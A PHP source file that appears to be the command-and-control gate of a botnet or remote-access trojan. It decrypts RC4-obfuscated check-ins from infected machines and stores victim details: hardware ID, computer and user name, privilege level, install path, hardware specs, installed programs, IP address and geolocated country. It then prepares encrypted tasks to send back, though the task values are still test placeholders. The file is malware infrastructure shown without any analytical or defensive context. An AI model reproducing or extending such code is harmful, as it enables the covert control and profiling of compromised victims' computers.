<?php
include 'include/config.php';
include 'include/rc4.php';
include 'include/geo.php';

function decryptNewClient($rc4Key, $info)
{
    foreach ($info as $key => $value) { if($key != "fp") { $info[$key] = rc4($rc4Key, base64_decode($value)); } }
    foreach ($info["fp"] as &$value) { $value = rc4($rc4Key, base64_decode($value)); }
    if ($info["check"] != "check") {  return "error"; }
    else 
    {
        $keys =  array("bn" => "buildName", "bt" => "buildType", "bu" => "buildVersion",
                    "ca" => "cpuArchitecture", "cc" => "cpuCores", "cn" => "computerName",
                    "cp" => "cpu", "gp" => "gpu", "hw" => "hwid",
                    "ip" => "installPath", "os" => "operatingSystem", "pr" => "privilege",
                    "ra" => "ram", "un" => "userName", "vr" => "vram",
                    "fp" => "foundPrograms");
        foreach ($keys as $key => $value)
        {
            foreach ($info as $iKey => $iValue)
            {
                if ($iKey == $key)
                {
                    $info[$value] = $info[$iKey];
                    unset($info[$iKey]);
                }
            }
        }
        $info['ipAddr'] = $_SERVER['REMOTE_ADDR'];
        $info['country'] = ip_info($info['ipAddr'], "Country Code");
        return $info; 
    }
}

if($_POST['new'] == "true") { $clientInfo = decryptNewClient($rc4Key, json_decode(base64_decode($_POST['request']), true)); }

$responce = array("task" => "test", "taskId" => "test", "taskParm" => "test");
foreach ($responce as $key => $value)
{ 
    $responce[$key] = base64_encode(rc4($rc4Key, $value)); 
}

$responce = base64_encode(json_encode($responce));
print_r($clientInfo);
?>